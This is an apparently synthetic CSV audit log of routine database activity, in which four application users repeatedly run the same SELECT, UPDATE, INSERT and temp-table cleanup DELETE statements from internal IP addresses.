timestamp,username,action,object_name,sql_text,client_ip,returncode,session_id
2026-01-11T16:30:50.276274,APP_USER,SELECT,EMPLOYEES,SELECT * FROM employees WHERE department_id = 10,192.168.1.100,0,SID1000
2026-01-11T15:27:50.276274,REPORT_USER,UPDATE,CUSTOMERS,UPDATE customers SET status = 'ACTIVE' WHERE id = 123,192.168.1.101,0,SID1001
2026-01-11T14:24:50.276274,ETL_USER,INSERT,ORDERS,"INSERT INTO orders VALUES (100, 'Product A', 50)",192.168.1.102,0,SID1002
2026-01-11T13:21:50.276274,WEB_USER,SELECT,PRODUCTS,SELECT COUNT(*) FROM products WHERE category = 'Electronics',192.168.1.103,0,SID1003
2026-01-11T12:18:50.276274,APP_USER,DELETE,TEMP_TABLE,DELETE FROM temp_table WHERE created_date < SYSDATE - 7,192.168.1.104,0,SID1004
2026-01-11T11:15:50.276274,REPORT_USER,SELECT,EMPLOYEES,SELECT * FROM employees WHERE department_id = 10,192.168.1.105,0,SID1005
2026-01-11T10:12:50.276274,ETL_USER,UPDATE,CUSTOMERS,UPDATE customers SET status = 'ACTIVE' WHERE id = 123,192.168.1.106,0,SID1006
2026-01-11T09:09:50.276274,WEB_USER,INSERT,ORDERS,"INSERT INTO orders VALUES (100, 'Product A', 50)",192.168.1.107,0,SID1007
2026-01-11T08:06:50.276274,APP_USER,SELECT,PRODUCTS,SELECT COUNT(*) FROM products WHERE category = 'Electronics',192.168.1.108,0,SID1008
2026-01-11T07:03:50.276274,REPORT_USER,DELETE,TEMP_TABLE,DELETE FROM temp_table WHERE created_date < SYSDATE - 7,192.168.1.109,0,SID1009
2026-01-11T06:00:50.276274,ETL_USER,SELECT,EMPLOYEES,SELECT * FROM employees WHERE department_id = 10,192.168.1.110,0,SID1010
2026-01-11T04:57:50.276274,WEB_USER,UPDATE,CUSTOMERS,UPDATE customers SET status = 'ACTIVE' WHERE id = 123,192.168.1.111,0,SID1011
2026-01-11T03:54:50.276274,APP_USER,INSERT,ORDERS,"INSERT INTO orders VALUES (100, 'Product A', 50)",192.168.1.112,0,SID1012
2026-01-11T02:51:50.276274,REPORT_USER,SELECT,PRODUCTS,SELECT COUNT(*) FROM products WHERE category = 'Electronics',192.168.1.113,0,SID1013
2026-01-11T01:48:50.276274,ETL_USER,DELETE,TEMP_TABLE,DELETE FROM temp_table WHERE created_date < SYSDATE - 7,192.168.1.114,0,SID1014
2026-01-11T00:45:50.276274,WEB_USER,SELECT,EMPLOYEES,SELECT * FROM employees WHERE department_id = 10,192.168.1.115,0,SID1015
2026-01-10T23:42:50.276274,APP_USER,UPDATE,CUSTOMERS,UPDATE customers SET status = 'ACTIVE' WHERE id = 123,192.168.1.116,0,SID1016
2026-01-10T22:39:50.276274,REPORT_USER,INSERT,ORDERS,"INSERT INTO orders VALUES (100, 'Product A', 50)",192.168.1.117,0,SID1017
2026-01-10T21:36:50.276274,ETL_USER,SELECT,PRODUCTS,SELECT COUNT(*) FROM products WHERE category = 'Electronics',192.168.1.118,0,SID1018
2026-01-10T20:33:50.276274,WEB_USER,DELETE,TEMP_TABLE,DELETE FROM temp_table WHERE created_date < SYSDATE - 7,192.168.1.119,0,SID1019
2026-01-10T19:30:50.276274,APP_USER,SELECT,EMPLOYEES,SELECT * FROM employees WHERE department_id = 10,192.168.1.120,0,SID1020
2026-01-10T18:27:50.276274,REPORT_USER,UPDATE,CUSTOMERS,UPDATE customers SET status = 'ACTIVE' WHERE id = 123,192.168.1.121,0,SID1021
2026-01-10T17:24:50.276274,ETL_USER,INSERT,ORDERS,"INSERT INTO orders VALUES (100, 'Product A', 50)",192.168.1.122,0,SID1022
2026-01-10T16:21:50.276274,WEB_USER,SELECT,PRODUCTS,SELECT COUNT(*) FROM products WHERE category = 'Electronics',192.168.1.123,0,SID1023
2026-01-10T15:18:50.276274,APP_USER,DELETE,TEMP_TABLE,DELETE FROM temp_table WHERE created_date < SYSDATE - 7,192.168.1.124,0,SID1024
2026-01-10T14:15:50.276274,REPORT_USER,SELECT,EMPLOYEES,SELECT * FROM employees WHERE department_id = 10,192.168.1.125,0,SID1025
2026-01-10T13:12:50.276274,ETL_USER,UPDATE,CUSTOMERS,UPDATE customers SET status = 'ACTIVE' WHERE id = 123,192.168.1.126,0,SID1026
2026-01-10T12:09:50.276274,WEB_USER,INSERT,ORDERS,"INSERT INTO orders VALUES (100, 'Product A', 50)",192.168.1.127,0,SID1027
2026-01-10T11:06:50.276274,APP_USER,SELECT,PRODUCTS,SELECT COUNT(*) FROM products WHERE category = 'Electronics',192.168.1.128,0,SID1028
2026-01-10T10:03:50.276274,REPORT_USER,DELETE,TEMP_TABLE,DELETE FROM temp_table WHERE created_date < SYSDATE - 7,192.168.1.129,0,SID1029
2026-01-10T09:00:50.276274,ETL_USER,SELECT,EMPLOYEES,SELECT * FROM employees WHERE department_id = 10,192.168.1.130,0,SID1030
2026-01-10T07:57:50.276274,WEB_USER,UPDATE,CUSTOMERS,UPDATE customers SET status = 'ACTIVE' WHERE id = 123,192.168.1.131,0,SID1031
2026-01-10T06:54:50.276274,APP_USER,INSERT,ORDERS,"INSERT INTO orders VALUES (100, 'Product A', 50)",192.168.1.132,0,SID1032
2026-01-10T05:51:50.276274,REPORT_USER,SELECT,PRODUCTS,SELECT COUNT(*) FROM products WHERE category = 'Electronics',192.168.1.133,0,SID1033
2026-01-10T04:48:50.276274,ETL_USER,DELETE,TEMP_TABLE,DELETE FROM temp_table WHERE created_date < SYSDATE - 7,192.168.1.134,0,SID1034
2026-01-10T03:45:50.276274,WEB_USER,SELECT,EMPLOYEES,SELECT * FROM employees WHERE department_id = 10,192.168.1.135,0,SID1035
2026-01-10T02:42:50.276274,APP_USER,UPDATE,CUSTOMERS,UPDATE customers SET status = 'ACTIVE' WHERE id = 123,192.168.1.136,0,SID1036
2026-01-10T01:39:50.276274,REPORT_USER,INSERT,ORDERS,"INSERT INTO orders VALUES (100, 'Product A', 50)",192.168.1.137,0,SID1037
2026-01-10T00:36:50.276274,ETL_USER,SELECT,PRODUCTS,SELECT COUNT(*) FROM products WHERE category = 'Electronics',192.168.1.138,0,SID1038
